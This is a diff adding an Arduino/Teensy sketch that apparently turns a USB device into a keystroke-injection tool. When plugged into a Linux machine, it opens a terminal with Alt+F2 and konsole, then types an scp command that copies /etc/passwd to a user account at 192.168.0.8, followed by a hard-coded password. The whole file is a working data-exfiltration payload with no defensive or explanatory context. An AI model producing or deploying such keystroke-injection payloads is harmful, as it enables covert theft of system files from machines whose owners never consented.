@@ -1,0 +1,32 @@
+void setup() {} 
+void loop () 
+{ 
+  delay(5000); 
+  Command("konsole"); 
+  delay(8000); 
+  Keyboard.print("scp /etc/passwd chap0@192.168.0.8:/home/chap0/\r\n"); 
+  delay(5000); 
+  Keyboard.print("password\r\n"); 
+  delay(9000000); 
+  
+} 
+
+void Command(char *SomeCommand){ 
+Keyboard.set_modifier(MODIFIERKEY_ALT); 
+Keyboard.set_key1(KEY_F2); 
+Keyboard.send_now(); 
+
+Keyboard.set_modifier(0); 
+Keyboard.set_key1(0); 
+Keyboard.send_now(); 
+
+delay(1500); 
+
+Keyboard.print(SomeCommand); 
+Keyboard.set_key1(KEY_ENTER); 
+Keyboard.send_now(); 
+
+Keyboard.set_key1(0); 
+Keyboard.send_now(); 
+
+} 
